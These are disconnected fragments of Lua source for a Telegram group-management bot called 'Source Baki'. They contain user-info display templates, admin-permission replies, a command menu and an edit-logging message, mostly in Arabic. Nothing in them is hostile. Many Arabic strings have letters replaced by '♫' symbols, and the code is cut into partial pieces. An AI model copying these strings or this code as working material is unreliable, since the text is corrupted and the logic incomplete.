tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
...
[[
🌨♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫Use ⇨ #username 🌨
🌨♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫iD ⇨ #id 🌨
🌨♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫Sta ⇨  #stast 🌨
🌨♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫Msg ⇨ #msgs 🌨
🌨♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫NaMe ⇨ #name  🌨
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
...
[[
↑♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username ♫ 
↑♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫𝙄𝘿 ➱ #id
↑♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫𝙍𝘼𝙉𝙆 ➱  #stast ♫ 
↑♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫𝙈𝘼𝙎𝙂 ➱ #msgs ♫ 
↑♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫𝗖𝗛 ➯  ↝@SourceBaki↜ ♫ 
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
?? 𝟔 𖡻 #msgs  ࿇🦄
...
-- vardump(data) 
DRAGONdx(msg.chat_id_, msg.id_, ' ♫ايدي المجموعة  ⇇↝ '..msg.chat_id_..' ↜\n ♫♫دد الادمنيه  ⇇↝ *'..data.administrator_count_..' ↜*\n ♫ ♫د المحظورين  ⇇↝ *'..data.kicked_count_..' ↜*\n ♫ ع♫ الاعضاء  ⇇↝ *'..data.member_count_..' ↜*\n', 'md') 
end 
...
send(msg.chat_id_,msg.id_,'\n ♫اهلا عزيزي البوت هنا ادمن'..'\n ♫♫صلاحياته هي ♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫ \n━━━━━━━━━━'..'\n ♫ ♫ير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n ♫ م♫ الرسائل ↞ ❴ '..delete..' ❵'..'\n ♫ حظ♫المستخدمين ↞ ❴ '..restrict..' ❵'..'\n ♫ دعو♫مستخدمين ↞ ❴ '..invite..' ❵'..'\n ♫ تثبي♫الرسائل ↞ ❴ '..pin..' ❵'..'\n ♫ اضافة♫شرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end
...
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'♫اذا الامر خاص بالادمنيه\n♫♫سل {⑩} لعرض اوامر الاعضاء')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
...
[🎯ألعاب سورس باكي الاحسن في التليجرام .↑]
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 [《SOURCE BAKI》 ](t.me/SourceBaki)
]]
keyboard = {} 
...
send(msg.chat_id_, msg.id_," ♫ـم تـفعـيل مريم") 
return false  
end
end
...
if not my_ph then
send(msg.chat_id_, msg.id_," ♫ريم  معطله") 
return false  
end
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
...
local Teext =[[
🚨 اهلا بك في قسم الاوامر ..↑♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫
 اختر الامر الذي تريدها .↑♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫
ده من الازرار بلاسفل . ♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
❲[《SOURCE BAKI》 ](t.me/SourceBaki)❳ 
]]
keyboard = {} 
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'باكي')
...
send(msg.chat_id_,0,''..t..'\n♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫\n ♫تم التعديل على الميديا\n ♫♫لشخص الي قام بالتعديل\n ♫ ♫دي الشخص ◂ '..result.sender_user_id_..'\n ♫ م♫ف الشخص ↚{ '..users..' }') 
end,nil)
